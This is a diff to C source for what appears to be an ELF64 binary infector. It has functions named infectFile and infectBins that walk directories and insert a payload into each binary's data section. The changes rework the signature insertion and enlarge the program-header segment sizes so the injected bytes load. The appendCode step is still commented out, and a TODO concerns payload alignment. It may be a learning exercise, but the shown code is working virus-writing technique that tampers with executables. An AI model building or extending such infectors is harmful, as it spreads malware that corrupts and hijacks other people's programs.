@@ -279,7 +279,7 @@ static Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
 static void  appendSignature(struct bfile file, size_t offset) {
   size_t  toAdd;
 
-char payload[] = "HelloWorld";
+  char payload[] = "HelloWorldaaaaa";
   toAdd = strlen(payload) + 1;
   memmove(((void *)file.header) + offset + toAdd, ((void *)file.header) + offset, file.size - offset);
   memcpy(((void *)file.header) + offset, payload, toAdd);
@@ -327,17 +327,30 @@ static int  appendCode(struct bfile *bin) {
 
 static int  infectFile(struct bfile bin) {
   size_t      len;
+  size_t      size;
+  Elf64_Phdr  *seg;
   Elf64_Shdr  *data;
   Elf64_Off   offset;
 
-char payload[] = "HelloWorld";
+  char payload[] = "HelloWorldaaaaa";
   len = strlen(payload);
   data = getDataSectionHeader(bin.header);
-  data->sh_size += len + 1;
   offset = data->sh_offset;
-  appendSignature(bin, offset + data->sh_size - (len + 1));
+  size = data->sh_size;
+  appendSignature(bin, offset + size);
+  updateOffsets(bin.header, offset + size, len + 1);
+  data = getDataSectionHeader(bin.header);
+  seg = ((void *)bin.header) + bin.header->e_phoff;
+  while (seg != ((void *)bin.header) + bin.header->e_phoff + bin.header->e_phnum * sizeof(Elf64_Phdr)) {
+    if (seg->p_offset <= data->sh_offset &&
+      seg->p_offset + seg->p_filesz >= data->sh_offset + data->sh_size) {
+      seg->p_filesz += strlen(payload) + 1;
+      seg->p_memsz += strlen(payload) + 1;
+    }
+    seg += 1;
+  }
+  data->sh_size += strlen(payload) + 1;
   bin.size += len + 1;
-  updateOffsets(bin.header, offset + data->sh_size - len - 1, len + 1);
   /* if (appendCode(&bin) == -1) */
   /*   return (-1); */
   write(bin.fd, bin.header, bin.size);
@@ -384,6 +397,7 @@ static int  infectBins(const char *dirname) {
   return (0);
 }
 
+// TODO Payload must be aligned on 16
 int   entry_point(void) {
   /* size_t  i; */
   // TODO Array of string
